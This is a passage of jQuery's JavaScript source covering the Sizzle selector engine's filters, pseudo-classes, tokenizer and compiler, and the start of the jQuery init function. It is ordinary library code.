
				PSEUDO: function( match ) {
					var excess,
						unquoted = !match[ 6 ] && match[ 2 ];

					if ( matchExpr.CHILD.test( match[ 0 ] ) ) {
						return null;
					}

					// Accept quoted arguments as-is
					if ( match[ 3 ] ) {
						match[ 2 ] = match[ 4 ] || match[ 5 ] || "";

					// Strip excess characters from unquoted arguments
					} else if ( unquoted && rpseudo.test( unquoted ) &&

						// Get excess from tokenize (recursively)
						( excess = tokenize( unquoted, true ) ) &&

						// advance to the next closing parenthesis
						( excess = unquoted.indexOf( ")", unquoted.length - excess ) - unquoted.length ) ) {

						// excess is a negative index
						match[ 0 ] = match[ 0 ].slice( 0, excess );
						match[ 2 ] = unquoted.slice( 0, excess );
					}

					// Return only captures needed by the pseudo filter method (type and argument)
					return match.slice( 0, 3 );
				}
			},

			filter: {

				TAG: function( nodeNameSelector ) {
					var expectedNodeName = nodeNameSelector.replace( runescape, funescape ).toLowerCase();
					return nodeNameSelector === "*" ?
						function() {
							return true;
						} :
						function( elem ) {
							return nodeName( elem, expectedNodeName );
						};
				},

				CLASS: function( className ) {
					var pattern = classCache[ className + " " ];

					return pattern ||
						( pattern = new RegExp( "(^|" + whitespace + ")" + className +
							"(" + whitespace + "|$)" ) ) &&
						classCache( className, function( elem ) {
							return pattern.test(
								typeof elem.className === "string" && elem.className ||
									typeof elem.getAttribute !== "undefined" &&
										elem.getAttribute( "class" ) ||
									""
							);
						} );
				},

				ATTR: function( name, operator, check ) {
					return function( elem ) {
						var result = find.attr( elem, name );

						if ( result == null ) {
							return operator === "!=";
						}
						if ( !operator ) {
							return true;
						}

						result += "";

						if ( operator === "=" ) {
							return result === check;
						}
						if ( operator === "!=" ) {
							return result !== check;
						}
						if ( operator === "^=" ) {
							return check && result.indexOf( check ) === 0;
						}
						if ( operator === "*=" ) {
							return check && result.indexOf( check ) > -1;
						}
						if ( operator === "$=" ) {
							return check && result.slice( -check.length ) === check;
						}
						if ( operator === "~=" ) {
							return ( " " + result.replace( rwhitespace, " " ) + " " )
								.indexOf( check ) > -1;
						}
						if ( operator === "|=" ) {
							return result === check || result.slice( 0, check.length + 1 ) === check + "-";
						}

						return false;
					};
				},

				CHILD: function( type, what, _argument, first, last ) {
					var simple = type.slice( 0, 3 ) !== "nth",
						forward = type.slice( -4 ) !== "last",
						ofType = what === "of-type";

					return first === 1 && last === 0 ?

						// Shortcut for :nth-*(n)
						function( elem ) {
							return !!elem.parentNode;
						} :

						function( elem, _context, xml ) {
							var cache, outerCache, node, nodeIndex, start,
								dir = simple !== forward ? "nextSibling" : "previousSibling",
								parent = elem.parentNode,
								name = ofType && elem.nodeName.toLowerCase(),
								useCache = !xml && !ofType,
								diff = false;

							if ( parent ) {

								// :(first|last|only)-(child|of-type)
								if ( simple ) {
									while ( dir ) {
										node = elem;
										while ( ( node = node[ dir ] ) ) {
											if ( ofType ?
												nodeName( node, name ) :
												node.nodeType === 1 ) {

												return false;
											}
										}

										// Reverse direction for :only-* (if we haven't yet done so)
										start = dir = type === "only" && !start && "nextSibling";
									}
									return true;
								}

								start = [ forward ? parent.firstChild : parent.lastChild ];

								// non-xml :nth-child(...) stores cache data on `parent`
								if ( forward && useCache ) {

									// Seek `elem` from a previously-cached index
									outerCache = parent[ expando ] || ( parent[ expando ] = {} );
									cache = outerCache[ type ] || [];
									nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
									diff = nodeIndex && cache[ 2 ];
									node = nodeIndex && parent.childNodes[ nodeIndex ];

									while ( ( node = ++nodeIndex && node && node[ dir ] ||

										// Fallback to seeking `elem` from the start
										( diff = nodeIndex = 0 ) || start.pop() ) ) {

										// When found, cache indexes on `parent` and break
										if ( node.nodeType === 1 && ++diff && node === elem ) {
											outerCache[ type ] = [ dirruns, nodeIndex, diff ];
											break;
										}
									}

								} else {

									// Use previously-cached element index if available
									if ( useCache ) {
										outerCache = elem[ expando ] || ( elem[ expando ] = {} );
										cache = outerCache[ type ] || [];
										nodeIndex = cache[ 0 ] === dirruns && cache[ 1 ];
										diff = nodeIndex;
									}

									// xml :nth-child(...)
									// or :nth-last-child(...) or :nth(-last)?-of-type(...)
									if ( diff === false ) {

										// Use the same loop as above to seek `elem` from the start
										while ( ( node = ++nodeIndex && node && node[ dir ] ||
											( diff = nodeIndex = 0 ) || start.pop() ) ) {

											if ( ( ofType ?
												nodeName( node, name ) :
												node.nodeType === 1 ) &&
												++diff ) {

												// Cache the index of each encountered element
												if ( useCache ) {
													outerCache = node[ expando ] ||
														( node[ expando ] = {} );
													outerCache[ type ] = [ dirruns, diff ];
												}

												if ( node === elem ) {
													break;
												}
											}
										}
									}
								}

								// Incorporate the offset, then check against cycle size
								diff -= last;
								return diff === first || ( diff % first === 0 && diff / first >= 0 );
							}
						};
				},

				PSEUDO: function( pseudo, argument ) {

					// pseudo-class names are case-insensitive
					// https://www.w3.org/TR/selectors/#pseudo-classes
					// Prioritize by case sensitivity in case custom pseudos are added with uppercase letters
					// Remember that setFilters inherits from pseudos
					var args,
						fn = Expr.pseudos[ pseudo ] || Expr.setFilters[ pseudo.toLowerCase() ] ||
							find.error( "unsupported pseudo: " + pseudo );

					// The user may use createPseudo to indicate that
					// arguments are needed to create the filter function
					// just as jQuery does
					if ( fn[ expando ] ) {
						return fn( argument );
					}

					// But maintain support for old signatures
					if ( fn.length > 1 ) {
						args = [ pseudo, pseudo, "", argument ];
						return Expr.setFilters.hasOwnProperty( pseudo.toLowerCase() ) ?
							markFunction( function( seed, matches ) {
								var idx,
									matched = fn( seed, argument ),
									i = matched.length;
								while ( i-- ) {
									idx = indexOf.call( seed, matched[ i ] );
									seed[ idx ] = !( matches[ idx ] = matched[ i ] );
								}
							} ) :
							function( elem ) {
								return fn( elem, 0, args );
							};
					}

					return fn;
				}
			},

			pseudos: {

				// Potentially complex pseudos
				not: markFunction( function( selector ) {

					// Trim the selector passed to compile
					// to avoid treating leading and trailing
					// spaces as combinators
					var input = [],
						results = [],
						matcher = compile( selector.replace( rtrimCSS, "$1" ) );

					return matcher[ expando ] ?
						markFunction( function( seed, matches, _context, xml ) {
							var elem,
								unmatched = matcher( seed, null, xml, [] ),
								i = seed.length;

							// Match elements unmatched by `matcher`
							while ( i-- ) {
								if ( ( elem = unmatched[ i ] ) ) {
									seed[ i ] = !( matches[ i ] = elem );
								}
							}
						} ) :
						function( elem, _context, xml ) {
							input[ 0 ] = elem;
							matcher( input, null, xml, results );

							// Don't keep the element
							// (see https://github.com/jquery/sizzle/issues/299)
							input[ 0 ] = null;
							return !results.pop();
						};
				} ),

				has: markFunction( function( selector ) {
					return function( elem ) {
						return find( selector, elem ).length > 0;
					};
				} ),

				contains: markFunction( function( text ) {
					text = text.replace( runescape, funescape );
					return function( elem ) {
						return ( elem.textContent || jQuery.text( elem ) ).indexOf( text ) > -1;
					};
				} ),

				// "Whether an element is represented by a :lang() selector
				// is based solely on the element's language value
				// being equal to the identifier C,
				// or beginning with the identifier C immediately followed by "-".
				// The matching of C against the element's language value is performed case-insensitively.
				// The identifier C does not have to be a valid language name."
				// https://www.w3.org/TR/selectors/#lang-pseudo
				lang: markFunction( function( lang ) {

					// lang value must be a valid identifier
					if ( !ridentifier.test( lang || "" ) ) {
						find.error( "unsupported lang: " + lang );
					}
					lang = lang.replace( runescape, funescape ).toLowerCase();
					return function( elem ) {
						var elemLang;
						do {
							if ( ( elemLang = documentIsHTML ?
								elem.lang :
								elem.getAttribute( "xml:lang" ) || elem.getAttribute( "lang" ) ) ) {

								elemLang = elemLang.toLowerCase();
								return elemLang === lang || elemLang.indexOf( lang + "-" ) === 0;
							}
						} while ( ( elem = elem.parentNode ) && elem.nodeType === 1 );
						return false;
					};
				} ),

				// Miscellaneous
				target: function( elem ) {
					var hash = window.location && window.location.hash;
					return hash && hash.slice( 1 ) === elem.id;
				},

				root: function( elem ) {
					return elem === documentElement;
				},

				focus: function( elem ) {
					return elem === safeActiveElement() &&
						document.hasFocus() &&
						!!( elem.type || elem.href || ~elem.tabIndex );
				},

				// Boolean properties
				enabled: createDisabledPseudo( false ),
				disabled: createDisabledPseudo( true ),

				checked: function( elem ) {

					// In CSS3, :checked should return both checked and selected elements
					// https://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
					return ( nodeName( elem, "input" ) && !!elem.checked ) ||
						( nodeName( elem, "option" ) && !!elem.selected );
				},

				selected: function( elem ) {

					// Support: IE <=11+
					// Accessing the selectedIndex property
					// forces the browser to treat the default option as
					// selected when in an optgroup.
					if ( elem.parentNode ) {
						// eslint-disable-next-line no-unused-expressions
						elem.parentNode.selectedIndex;
					}

					return elem.selected === true;
				},

				// Contents
				empty: function( elem ) {

					// https://www.w3.org/TR/selectors/#empty-pseudo
					// :empty is negated by element (1) or content nodes (text: 3; cdata: 4; entity ref: 5),
					//   but not by others (comment: 8; processing instruction: 7; etc.)
					// nodeType < 6 works because attributes (2) do not appear as children
					for ( elem = elem.firstChild; elem; elem = elem.nextSibling ) {
						if ( elem.nodeType < 6 ) {
							return false;
						}
					}
					return true;
				},

				parent: function( elem ) {
					return !Expr.pseudos.empty( elem );
				},

				// Element/input types
				header: function( elem ) {
					return rheader.test( elem.nodeName );
				},

				input: function( elem ) {
					return rinputs.test( elem.nodeName );
				},

				button: function( elem ) {
					return nodeName( elem, "input" ) && elem.type === "button" ||
						nodeName( elem, "button" );
				},

				text: function( elem ) {
					var attr;
					return nodeName( elem, "input" ) && elem.type === "text" &&

						// Support: IE <10 only
						// New HTML5 attribute values (e.g., "search") appear
						// with elem.type === "text"
						( ( attr = elem.getAttribute( "type" ) ) == null ||
							attr.toLowerCase() === "text" );
				},

				// Position-in-collection
				first: createPositionalPseudo( function() {
					return [ 0 ];
				} ),

				last: createPositionalPseudo( function( _matchIndexes, length ) {
					return [ length - 1 ];
				} ),

				eq: createPositionalPseudo( function( _matchIndexes, length, argument ) {
					return [ argument < 0 ? argument + length : argument ];
				} ),

				even: createPositionalPseudo( function( matchIndexes, length ) {
					var i = 0;
					for ( ; i < length; i += 2 ) {
						matchIndexes.push( i );
					}
					return matchIndexes;
				} ),

				odd: createPositionalPseudo( function( matchIndexes, length ) {
					var i = 1;
					for ( ; i < length; i += 2 ) {
						matchIndexes.push( i );
					}
					return matchIndexes;
				} ),

				lt: createPositionalPseudo( function( matchIndexes, length, argument ) {
					var i;

					if ( argument < 0 ) {
						i = argument + length;
					} else if ( argument > length ) {
						i = length;
					} else {
						i = argument;
					}

					for ( ; --i >= 0; ) {
						matchIndexes.push( i );
					}
					return matchIndexes;
				} ),

				gt: createPositionalPseudo( function( matchIndexes, length, argument ) {
					var i = argument < 0 ? argument + length : argument;
					for ( ; ++i < length; ) {
						matchIndexes.push( i );
					}
					return matchIndexes;
				} )
			}
		};

		Expr.pseudos.nth = Expr.pseudos.eq;

		// Add button/input type pseudos
		for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
			Expr.pseudos[ i ] = createInputPseudo( i );
		}
		for ( i in { submit: true, reset: true } ) {
			Expr.pseudos[ i ] = createButtonPseudo( i );
		}

		// Easy API for creating new setFilters
		function setFilters() {}
		setFilters.prototype = Expr.filters = Expr.pseudos;
		Expr.setFilters = new setFilters();

		function tokenize( selector, parseOnly ) {
			var matched, match, tokens, type,
				soFar, groups, preFilters,
				cached = tokenCache[ selector + " " ];

			if ( cached ) {
				return parseOnly ? 0 : cached.slice( 0 );
			}

			soFar = selector;
			groups = [];
			preFilters = Expr.preFilter;

			while ( soFar ) {

				// Comma and first run
				if ( !matched || ( match = rcomma.exec( soFar ) ) ) {
					if ( match ) {

						// Don't consume trailing commas as valid
						soFar = soFar.slice( match[ 0 ].length ) || soFar;
					}
					groups.push( ( tokens = [] ) );
				}

				matched = false;

				// Combinators
				if ( ( match = rleadingCombinator.exec( soFar ) ) ) {
					matched = match.shift();
					tokens.push( {
						value: matched,

						// Cast descendant combinators to space
						type: match[ 0 ].replace( rtrimCSS, " " )
					} );
					soFar = soFar.slice( matched.length );
				}

				// Filters
				for ( type in Expr.filter ) {
					if ( ( match = matchExpr[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
						( match = preFilters[ type ]( match ) ) ) ) {
						matched = match.shift();
						tokens.push( {
							value: matched,
							type: type,
							matches: match
						} );
						soFar = soFar.slice( matched.length );
					}
				}

				if ( !matched ) {
					break;
				}
			}

			// Return the length of the invalid excess
			// if we're just parsing
			// Otherwise, throw an error or return tokens
			if ( parseOnly ) {
				return soFar.length;
			}

			return soFar ?
				find.error( selector ) :

				// Cache the tokens
				tokenCache( selector, groups ).slice( 0 );
		}

		function toSelector( tokens ) {
			var i = 0,
				len = tokens.length,
				selector = "";
			for ( ; i < len; i++ ) {
				selector += tokens[ i ].value;
			}
			return selector;
		}

		function addCombinator( matcher, combinator, base ) {
			var dir = combinator.dir,
				skip = combinator.next,
				key = skip || dir,
				checkNonElements = base && key === "parentNode",
				doneName = done++;

			return combinator.first ?

				// Check against closest ancestor/preceding element
				function( elem, context, xml ) {
					while ( ( elem = elem[ dir ] ) ) {
						if ( elem.nodeType === 1 || checkNonElements ) {
							return matcher( elem, context, xml );
						}
					}
					return false;
				} :

				// Check against all ancestor/preceding elements
				function( elem, context, xml ) {
					var oldCache, outerCache,
						newCache = [ dirruns, doneName ];

					// We can't set arbitrary data on XML nodes, so they don't benefit from combinator caching
					if ( xml ) {
						while ( ( elem = elem[ dir ] ) ) {
							if ( elem.nodeType === 1 || checkNonElements ) {
								if ( matcher( elem, context, xml ) ) {
									return true;
								}
							}
						}
					} else {
						while ( ( elem = elem[ dir ] ) ) {
							if ( elem.nodeType === 1 || checkNonElements ) {
								outerCache = elem[ expando ] || ( elem[ expando ] = {} );

								if ( skip && nodeName( elem, skip ) ) {
									elem = elem[ dir ] || elem;
								} else if ( ( oldCache = outerCache[ key ] ) &&
									oldCache[ 0 ] === dirruns && oldCache[ 1 ] === doneName ) {

									// Assign to newCache so results back-propagate to previous elements
									return ( newCache[ 2 ] = oldCache[ 2 ] );
								} else {

									// Reuse newcache so results back-propagate to previous elements
									outerCache[ key ] = newCache;

									// A match means we're done; a fail means we have to keep checking
									if ( ( newCache[ 2 ] = matcher( elem, context, xml ) ) ) {
										return true;
									}
								}
							}
						}
					}
					return false;
				};
		}

		function elementMatcher( matchers ) {
			return matchers.length > 1 ?
				function( elem, context, xml ) {
					var i = matchers.length;
					while ( i-- ) {
						if ( !matchers[ i ]( elem, context, xml ) ) {
							return false;
						}
					}
					return true;
				} :
				matchers[ 0 ];
		}

		function multipleContexts( selector, contexts, results ) {
			var i = 0,
				len = contexts.length;
			for ( ; i < len; i++ ) {
				find( selector, contexts[ i ], results );
			}
			return results;
		}

		function condense( unmatched, map, filter, context, xml ) {
			var elem,
				newUnmatched = [],
				i = 0,
				len = unmatched.length,
				mapped = map != null;

			for ( ; i < len; i++ ) {
				if ( ( elem = unmatched[ i ] ) ) {
					if ( !filter || filter( elem, context, xml ) ) {
						newUnmatched.push( elem );
						if ( mapped ) {
							map.push( i );
						}
					}
				}
			}

			return newUnmatched;
		}

		function setMatcher( preFilter, selector, matcher, postFilter, postFinder, postSelector ) {
			if ( postFilter && !postFilter[ expando ] ) {
				postFilter = setMatcher( postFilter );
			}
			if ( postFinder && !postFinder[ expando ] ) {
				postFinder = setMatcher( postFinder, postSelector );
			}
			return markFunction( function( seed, results, context, xml ) {
				var temp, i, elem, matcherOut,
					preMap = [],
					postMap = [],
					preexisting = results.length,

					// Get initial elements from seed or context
					elems = seed ||
						multipleContexts( selector || "*",
							context.nodeType ? [ context ] : context, [] ),

					// Prefilter to get matcher input, preserving a map for seed-results synchronization
					matcherIn = preFilter && ( seed || !selector ) ?
						condense( elems, preMap, preFilter, context, xml ) :
						elems;

				if ( matcher ) {

					// If we have a postFinder, or filtered seed, or non-seed postFilter
					// or preexisting results,
					matcherOut = postFinder || ( seed ? preFilter : preexisting || postFilter ) ?

						// ...intermediate processing is necessary
						[] :

						// ...otherwise use results directly
						results;

					// Find primary matches
					matcher( matcherIn, matcherOut, context, xml );
				} else {
					matcherOut = matcherIn;
				}

				// Apply postFilter
				if ( postFilter ) {
					temp = condense( matcherOut, postMap );
					postFilter( temp, [], context, xml );

					// Un-match failing elements by moving them back to matcherIn
					i = temp.length;
					while ( i-- ) {
						if ( ( elem = temp[ i ] ) ) {
							matcherOut[ postMap[ i ] ] = !( matcherIn[ postMap[ i ] ] = elem );
						}
					}
				}

				if ( seed ) {
					if ( postFinder || preFilter ) {
						if ( postFinder ) {

							// Get the final matcherOut by condensing this intermediate into postFinder contexts
							temp = [];
							i = matcherOut.length;
							while ( i-- ) {
								if ( ( elem = matcherOut[ i ] ) ) {

									// Restore matcherIn since elem is not yet a final match
									temp.push( ( matcherIn[ i ] = elem ) );
								}
							}
							postFinder( null, ( matcherOut = [] ), temp, xml );
						}

						// Move matched elements from seed to results to keep them synchronized
						i = matcherOut.length;
						while ( i-- ) {
							if ( ( elem = matcherOut[ i ] ) &&
								( temp = postFinder ? indexOf.call( seed, elem ) : preMap[ i ] ) > -1 ) {

								seed[ temp ] = !( results[ temp ] = elem );
							}
						}
					}

				// Add elements to results, through postFinder if defined
				} else {
					matcherOut = condense(
						matcherOut === results ?
							matcherOut.splice( preexisting, matcherOut.length ) :
							matcherOut
					);
					if ( postFinder ) {
						postFinder( null, results, matcherOut, xml );
					} else {
						push.apply( results, matcherOut );
					}
				}
			} );
		}

		function matcherFromTokens( tokens ) {
			var checkContext, matcher, j,
				len = tokens.length,
				leadingRelative = Expr.relative[ tokens[ 0 ].type ],
				implicitRelative = leadingRelative || Expr.relative[ " " ],
				i = leadingRelative ? 1 : 0,

				// The foundational matcher ensures that elements are reachable from top-level context(s)
				matchContext = addCombinator( function( elem ) {
					return elem === checkContext;
				}, implicitRelative, true ),
				matchAnyContext = addCombinator( function( elem ) {
					return indexOf.call( checkContext, elem ) > -1;
				}, implicitRelative, true ),
				matchers = [ function( elem, context, xml ) {

					// Support: IE 11+, Edge 17 - 18+
					// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
					// two documents; shallow comparisons work.
					// eslint-disable-next-line eqeqeq
					var ret = ( !leadingRelative && ( xml || context != outermostContext ) ) || (
						( checkContext = context ).nodeType ?
							matchContext( elem, context, xml ) :
							matchAnyContext( elem, context, xml ) );

					// Avoid hanging onto element
					// (see https://github.com/jquery/sizzle/issues/299)
					checkContext = null;
					return ret;
				} ];

			for ( ; i < len; i++ ) {
				if ( ( matcher = Expr.relative[ tokens[ i ].type ] ) ) {
					matchers = [ addCombinator( elementMatcher( matchers ), matcher ) ];
				} else {
					matcher = Expr.filter[ tokens[ i ].type ].apply( null, tokens[ i ].matches );

					// Return special upon seeing a positional matcher
					if ( matcher[ expando ] ) {

						// Find the next relative operator (if any) for proper handling
						j = ++i;
						for ( ; j < len; j++ ) {
							if ( Expr.relative[ tokens[ j ].type ] ) {
								break;
							}
						}
						return setMatcher(
							i > 1 && elementMatcher( matchers ),
							i > 1 && toSelector(

								// If the preceding token was a descendant combinator, insert an implicit any-element `*`
								tokens.slice( 0, i - 1 )
									.concat( { value: tokens[ i - 2 ].type === " " ? "*" : "" } )
							).replace( rtrimCSS, "$1" ),
							matcher,
							i < j && matcherFromTokens( tokens.slice( i, j ) ),
							j < len && matcherFromTokens( ( tokens = tokens.slice( j ) ) ),
							j < len && toSelector( tokens )
						);
					}
					matchers.push( matcher );
				}
			}

			return elementMatcher( matchers );
		}

		function matcherFromGroupMatchers( elementMatchers, setMatchers ) {
			var bySet = setMatchers.length > 0,
				byElement = elementMatchers.length > 0,
				superMatcher = function( seed, context, xml, results, outermost ) {
					var elem, j, matcher,
						matchedCount = 0,
						i = "0",
						unmatched = seed && [],
						setMatched = [],
						contextBackup = outermostContext,

						// We must always have either seed elements or outermost context
						elems = seed || byElement && Expr.find.TAG( "*", outermost ),

						// Use integer dirruns iff this is the outermost matcher
						dirrunsUnique = ( dirruns += contextBackup == null ? 1 : Math.random() || 0.1 ),
						len = elems.length;

					if ( outermost ) {

						// Support: IE 11+, Edge 17 - 18+
						// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
						// two documents; shallow comparisons work.
						// eslint-disable-next-line eqeqeq
						outermostContext = context == document || context || outermost;
					}

					// Add elements passing elementMatchers directly to results
					// Support: iOS <=7 - 9 only
					// Tolerate NodeList properties (IE: "length"; Safari: <number>) matching
					// elements by id. (see trac-14142)
					for ( ; i !== len && ( elem = elems[ i ] ) != null; i++ ) {
						if ( byElement && elem ) {
							j = 0;

							// Support: IE 11+, Edge 17 - 18+
							// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
							// two documents; shallow comparisons work.
							// eslint-disable-next-line eqeqeq
							if ( !context && elem.ownerDocument != document ) {
								setDocument( elem );
								xml = !documentIsHTML;
							}
							while ( ( matcher = elementMatchers[ j++ ] ) ) {
								if ( matcher( elem, context || document, xml ) ) {
									push.call( results, elem );
									break;
								}
							}
							if ( outermost ) {
								dirruns = dirrunsUnique;
							}
						}

						// Track unmatched elements for set filters
						if ( bySet ) {

							// They will have gone through all possible matchers
							if ( ( elem = !matcher && elem ) ) {
								matchedCount--;
							}

							// Lengthen the array for every element, matched or not
							if ( seed ) {
								unmatched.push( elem );
							}
						}
					}

					// `i` is now the count of elements visited above, and adding it to `matchedCount`
					// makes the latter nonnegative.
					matchedCount += i;

					// Apply set filters to unmatched elements
					// NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount`
					// equals `i`), unless we didn't visit _any_ elements in the above loop because we have
					// no element matchers and no seed.
					// Incrementing an initially-string "0" `i` allows `i` to remain a string only in that
					// case, which will result in a "00" `matchedCount` that differs from `i` but is also
					// numerically zero.
					if ( bySet && i !== matchedCount ) {
						j = 0;
						while ( ( matcher = setMatchers[ j++ ] ) ) {
							matcher( unmatched, setMatched, context, xml );
						}

						if ( seed ) {

							// Reintegrate element matches to eliminate the need for sorting
							if ( matchedCount > 0 ) {
								while ( i-- ) {
									if ( !( unmatched[ i ] || setMatched[ i ] ) ) {
										setMatched[ i ] = pop.call( results );
									}
								}
							}

							// Discard index placeholder values to get only actual matches
							setMatched = condense( setMatched );
						}

						// Add matches to results
						push.apply( results, setMatched );

						// Seedless set matches succeeding multiple successful matchers stipulate sorting
						if ( outermost && !seed && setMatched.length > 0 &&
							( matchedCount + setMatchers.length ) > 1 ) {

							jQuery.uniqueSort( results );
						}
					}

					// Override manipulation of globals by nested matchers
					if ( outermost ) {
						dirruns = dirrunsUnique;
						outermostContext = contextBackup;
					}

					return unmatched;
				};

			return bySet ?
				markFunction( superMatcher ) :
				superMatcher;
		}

		function compile( selector, match /* Internal Use Only */ ) {
			var i,
				setMatchers = [],
				elementMatchers = [],
				cached = compilerCache[ selector + " " ];

			if ( !cached ) {

				// Generate a function of recursive functions that can be used to check each element
				if ( !match ) {
					match = tokenize( selector );
				}
				i = match.length;
				while ( i-- ) {
					cached = matcherFromTokens( match[ i ] );
					if ( cached[ expando ] ) {
						setMatchers.push( cached );
					} else {
						elementMatchers.push( cached );
					}
				}

				// Cache the compiled function
				cached = compilerCache( selector,
					matcherFromGroupMatchers( elementMatchers, setMatchers ) );

				// Save selector and tokenization
				cached.selector = selector;
			}
			return cached;
		}

		/**
		 * A low-level selection function that works with jQuery's compiled
		 *  selector functions
		 * @param {String|Function} selector A selector or a pre-compiled
		 *  selector function built with jQuery selector compile
		 * @param {Element} context
		 * @param {Array} [results]
		 * @param {Array} [seed] A set of elements to match against
		 */
		function select( selector, context, results, seed ) {
			var i, tokens, token, type, find,
				compiled = typeof selector === "function" && selector,
				match = !seed && tokenize( ( selector = compiled.selector || selector ) );

			results = results || [];

			// Try to minimize operations if there is only one selector in the list and no seed
			// (the latter of which guarantees us context)
			if ( match.length === 1 ) {

				// Reduce context if the leading compound selector is an ID
				tokens = match[ 0 ] = match[ 0 ].slice( 0 );
				if ( tokens.length > 2 && ( token = tokens[ 0 ] ).type === "ID" &&
						context.nodeType === 9 && documentIsHTML && Expr.relative[ tokens[ 1 ].type ] ) {

					context = ( Expr.find.ID(
						token.matches[ 0 ].replace( runescape, funescape ),
						context
					) || [] )[ 0 ];
					if ( !context ) {
						return results;

					// Precompiled matchers will still verify ancestry, so step up a level
					} else if ( compiled ) {
						context = context.parentNode;
					}

					selector = selector.slice( tokens.shift().value.length );
				}

				// Fetch a seed set for right-to-left matching
				i = matchExpr.needsContext.test( selector ) ? 0 : tokens.length;
				while ( i-- ) {
					token = tokens[ i ];

					// Abort if we hit a combinator
					if ( Expr.relative[ ( type = token.type ) ] ) {
						break;
					}
					if ( ( find = Expr.find[ type ] ) ) {

						// Search, expanding context for leading sibling combinators
						if ( ( seed = find(
							token.matches[ 0 ].replace( runescape, funescape ),
							rsibling.test( tokens[ 0 ].type ) &&
								testContext( context.parentNode ) || context
						) ) ) {

							// If seed is empty or no tokens remain, we can return early
							tokens.splice( i, 1 );
							selector = seed.length && toSelector( tokens );
							if ( !selector ) {
								push.apply( results, seed );
								return results;
							}

							break;
						}
					}
				}
			}

			// Compile and execute a filtering function if one is not provided
			// Provide `match` to avoid retokenization if we modified the selector above
			( compiled || compile( selector, match ) )(
				seed,
				context,
				!documentIsHTML,
				results,
				!context || rsibling.test( selector ) && testContext( context.parentNode ) || context
			);
			return results;
		}

		// One-time assignments

		// Support: Android <=4.0 - 4.1+
		// Sort stability
		support.sortStable = expando.split( "" ).sort( sortOrder ).join( "" ) === expando;

		// Initialize against the default document
		setDocument();

		// Support: Android <=4.0 - 4.1+
		// Detached nodes confoundingly follow *each other*
		support.sortDetached = assert( function( el ) {

			// Should return 1, but returns 4 (following)
			return el.compareDocumentPosition( document.createElement( "fieldset" ) ) & 1;
		} );

		jQuery.find = find;

		// Deprecated
		jQuery.expr[ ":" ] = jQuery.expr.pseudos;
		jQuery.unique = jQuery.uniqueSort;

		// These have always been private, but they used to be documented as part of
		// Sizzle so let's maintain them for now for backwards compatibility purposes.
		find.compile = compile;
		find.select = select;
		find.setDocument = setDocument;
		find.tokenize = tokenize;

		find.escape = jQuery.escapeSelector;
		find.getText = jQuery.text;
		find.isXML = jQuery.isXMLDoc;
		find.selectors = jQuery.expr;
		find.support = jQuery.support;
		find.uniqueSort = jQuery.uniqueSort;

			/* eslint-enable */

		} )();


		var dir = function( elem, dir, until ) {
			var matched = [],
				truncate = until !== undefined;

			while ( ( elem = elem[ dir ] ) && elem.nodeType !== 9 ) {
				if ( elem.nodeType === 1 ) {
					if ( truncate && jQuery( elem ).is( until ) ) {
						break;
					}
					matched.push( elem );
				}
			}
			return matched;
		};


		var siblings = function( n, elem ) {
			var matched = [];

			for ( ; n; n = n.nextSibling ) {
				if ( n.nodeType === 1 && n !== elem ) {
					matched.push( n );
				}
			}

			return matched;
		};


		var rneedsContext = jQuery.expr.match.needsContext;

		var rsingleTag = ( /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i );



		// Implement the identical functionality for filter and not
		function winnow( elements, qualifier, not ) {
			if ( isFunction( qualifier ) ) {
				return jQuery.grep( elements, function( elem, i ) {
					return !!qualifier.call( elem, i, elem ) !== not;
				} );
			}

			// Single element
			if ( qualifier.nodeType ) {
				return jQuery.grep( elements, function( elem ) {
					return ( elem === qualifier ) !== not;
				} );
			}

			// Arraylike of elements (jQuery, arguments, Array)
			if ( typeof qualifier !== "string" ) {
				return jQuery.grep( elements, function( elem ) {
					return ( indexOf.call( qualifier, elem ) > -1 ) !== not;
				} );
			}

			// Filtered directly for both simple and complex selectors
			return jQuery.filter( qualifier, elements, not );
		}

		jQuery.filter = function( expr, elems, not ) {
			var elem = elems[ 0 ];

			if ( not ) {
				expr = ":not(" + expr + ")";
			}

			if ( elems.length === 1 && elem.nodeType === 1 ) {
				return jQuery.find.matchesSelector( elem, expr ) ? [ elem ] : [];
			}

			return jQuery.find.matches( expr, jQuery.grep( elems, function( elem ) {
				return elem.nodeType === 1;
			} ) );
		};

		jQuery.fn.extend( {
			find: function( selector ) {
				var i, ret,
					len = this.length,
					self = this;

				if ( typeof selector !== "string" ) {
					return this.pushStack( jQuery( selector ).filter( function() {
						for ( i = 0; i < len; i++ ) {
							if ( jQuery.contains( self[ i ], this ) ) {
								return true;
							}
						}
					} ) );
				}

				ret = this.pushStack( [] );

				for ( i = 0; i < len; i++ ) {
					jQuery.find( selector, self[ i ], ret );
				}

				return len > 1 ? jQuery.uniqueSort( ret ) : ret;
			},
			filter: function( selector ) {
				return this.pushStack( winnow( this, selector || [], false ) );
			},
			not: function( selector ) {
				return this.pushStack( winnow( this, selector || [], true ) );
			},
			is: function( selector ) {
				return !!winnow(
					this,

					// If this is a positional/relative selector, check membership in the returned set
					// so $("p:first").is("p:last") won't return true for a doc with two "p".
					typeof selector === "string" && rneedsContext.test( selector ) ?
						jQuery( selector ) :
						selector || [],
					false
				).length;
			}
		} );


		// Initialize a jQuery object


		// A central reference to the root jQuery(document)
		var rootjQuery,

			// A simple way to check for HTML strings
			// Prioritize #id over <tag> to avoid XSS via location.hash (trac-9521)
			// Strict HTML recognition (trac-11290: must start with <)
			// Shortcut simple #id case for speed
			rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,

			init = jQuery.fn.init = function( selector, context, root ) {
				var match, elem;

				// HANDLE: $(""), $(null), $(undefined), $(false)
				if ( !selector ) {
					return this;
				}

				// Method init() accepts an alternate rootjQuery
				// so migrate can support jQuery.sub (gh-2101)
				root = root || rootjQuery;

				// Handle HTML strings
				if ( typeof selector === "string" ) {
					if ( selector[ 0 ] === "<" &&
						selector[ selector.length - 1 ] === ">" &&
						selector.length >= 3 ) {

						// Assume that strings that start and end with <> are HTML and skip the regex check
						match = [ null, selector, null ];

					} else {
